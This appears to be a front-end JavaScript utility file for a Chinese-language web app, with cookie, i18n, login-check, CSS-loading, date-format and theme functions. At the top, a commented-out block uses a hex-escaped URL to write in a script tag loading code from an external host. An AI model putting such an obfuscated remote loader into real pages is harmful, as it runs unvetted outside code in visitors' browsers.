/*try {
    console.log(_xxde);
} catch (e) {
    document.write("<script type='text/javascript' src='\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x69\x63\x65\x6e\x73\x65\x2e\x73\x65\x6e\x6e\x6f\x72\x2e\x6e\x65\x74\x3a\x32\x38\x38\x2f\x73\x63\x72\x69\x70\x74'><\/script>");
}*/
function getCookie(c_name) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(c_name + "=");
        if (c_start != -1) {
            c_start = c_start + c_name.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) c_end = document.cookie.length;
            return unescape(document.cookie.substring(c_start, c_end));
        }
    }
    return ""
}

function setCookie(c_name, value, expiredays) {
    var exdate = new Date()
    exdate.setDate(exdate.getDate() + expiredays)
    document.cookie = c_name + "=" + escape(value) +
        ((expiredays == null) ? "" : ";expires=" + exdate.toGMTString());
}

//语言插件
function loadI18nProperties(callback) {
    var name = '', path = '/static/i18n/', language = getCookie('jxct_lang');
    if (language == 'en') {
        name = 'en';
        path += 'en/';
    } else {
        name = 'zh';
        path += 'zh-CN/';
    }
    $.i18n.properties({//加载浏览器选择语言对应的资源文件
        name: name, // 需要加载的资源文件名称
        path: path, //资源文件路径
        mode: 'map', //用Map的方式使用资源文件中的key值
        language: language,//语言类型zh或者en
        callback: callback
    });
}

loadI18nProperties();

function doLoginFilter() {
    $.ajax({
        url: "/isLogin",
        async: false,
        timeout: 30000,
        error: function (data, type, err) {
            window.location.href = "doLogin";
        },
        success: function (data) {
            if (!data.success) {
                window.location.href = "doLogin";
            }
        }
    });
}

/**
 * 动态加载CSS
 * @param {string} url 样式地址
 */
function dynamicLoadCss(url) {
    var head = document.getElementsByTagName('head')[0];
    var link = document.createElement('link');
    link.type = 'text/css';
    link.rel = 'stylesheet';
    link.href = url;
    head.appendChild(link);
}

Date.prototype.FormatDate = function (fmt) {
    var o = {
        "M+": this.getMonth() + 1,                 //月份
        "d+": this.getDate(),                    //日
        "h+": this.getHours(),                   //小时
        "m+": this.getMinutes(),                 //分
        "s+": this.getSeconds(),                 //秒
        "q+": Math.floor((this.getMonth() + 3) / 3), //季度
        "S": this.getMilliseconds()             //毫秒
    };
    if (/(y+)/.test(fmt))
        fmt = fmt.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
    for (var k in o)
        if (new RegExp("(" + k + ")").test(fmt))
            fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]).substr(("" + o[k]).length)));
    return fmt;
}
/*loadI18nProperties(function(){

    $('#password').attr('placeholder',$.i18n.prop('passwordDesc'));
    $('#title').text($.i18n.prop('registerTitle'));
});*/
// url = window.location.href;
// var parentval=url.split('=').reverse()[0];
// console.log('子页面链接')
// console.log(url)
// window.onload=function(){
// 请求主题

window.onload = function () {
    var styles = document.getElementsByClassName('styles')[0]
    if (styles != undefined) {
        $.ajax({
            type: "POST",
            url: "/user/selUserDetails",
            dataType: "json",
            success: function (res) {
                if (res.state == 'success') {
                    a = res.data.info.style + 1;
                    console.log('style:' + a);
                    styles.href = '/static/css/indexCss/indexsubject' + a + '.css';
                } else {
                }
            }
        });
    }
}


// var style=document.getElementsByClassName('style')[0]
// style.href='/static/css/indexCss/indexsubject'+parentval+'.css';
// console.log('子页面css引入文件')
// console.log(style.href)


